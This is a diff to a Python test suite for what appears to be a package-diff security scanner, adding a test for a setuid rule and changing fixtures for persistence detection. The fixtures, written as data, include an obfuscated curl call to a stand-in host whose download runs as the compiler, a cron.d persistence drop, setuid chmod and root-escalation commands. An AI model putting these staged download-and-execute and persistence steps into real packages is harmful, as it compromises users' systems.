@@ -28,7 +28,7 @@ def test_persistence_paths_r054_did_not_enumerate(path):
     could never match.
     """
     assert "R054" in _shipped_ids(
-        [f'  install -Dm644 z "$pkgdir/{path}"'], declared=False, fn="package",
+        [f'  install -Dm644 z "/{path}"'], declared=False, fn="package",
     ), path
 
 
@@ -50,6 +50,34 @@ def test_every_way_to_ask_for_root(tool):
     """H004 named `sudo` and there are four ways to say it. Naming only the
     first tested which tool the writer preferred, not what it does."""
     assert "H004" in _shipped_ids([f"  {tool} sh -c 'id'"], declared=False)
+
+
+def test_r059_does_not_fire_inside_an_install_scriptlet():
+    """haven-desktop-git: `chmod 4755 /opt/Haven/chrome-sandbox` in
+    post_install is the Electron sandbox fix, not a build-host privilege
+    change - a hook runs on the target system after pacman unpacks."""
+    from trustsight.analysis import scan_diff
+    from .helpers import _PK
+
+    hook_diff = (
+        _PK
+        + "+pkgver=2\n"
+        + "--- /dev/null\n+++ b/p.install\n@@ -0,0 +1,3 @@\n"
+        + "+post_install() {\n"
+        + "+  chmod 4755 '/opt/Pkg/chrome-sandbox' || true\n"
+        + "+}\n"
+    )
+    ids = {e.rule_id for e in scan_diff(hook_diff, package_name="p").score_breakdown}
+    assert "R059" not in ids
+
+    build_diff = (
+        _PK
+        + "+package() {\n"
+        + "+  chmod 4755 /opt/live/bin/helper\n"
+        + "+}\n"
+    )
+    ids = {e.rule_id for e in scan_diff(build_diff, package_name="p").score_breakdown}
+    assert "R059" in ids
 
 
 @pytest.mark.parametrize("line,rule", [
@@ -689,7 +717,7 @@ def test_an_evasion_only_chain_can_reach_the_stage_count(isolated):
             "+build() {\n"
             '+  /usr/bin/c?rl -s https://e.example/x -o "$srcdir/p"\n'
             '+  export CC="$srcdir/p"\n+  make\n+}\n'
-            '+package() {\n+  install -Dm644 z "$pkgdir/etc/cron.d/z"\n+}\n')
+            '+package() {\n+  install -Dm644 z /etc/cron.d/z\n+}\n')
     assert "H043" in {e.rule_id for e in
                       scan_diff(text, package_name="p").score_breakdown}
 
@@ -708,7 +736,7 @@ def test_the_staged_attack_annotation_reaches_the_reader(isolated):
             "+build() {\n"
             '+  /usr/bin/c?rl -s https://e.example/x -o "$srcdir/p"\n'
             '+  export CC="$srcdir/p"\n+  make\n+}\n'
-            '+package() {\n+  install -Dm644 z "$pkgdir/etc/cron.d/z"\n+}\n')
+            '+package() {\n+  install -Dm644 z /etc/cron.d/z\n+}\n')
     fact = scan_diff(text, package_name="p")
     assert "H043" in {row["rule_id"] for row in finding_rows(fact)}
 
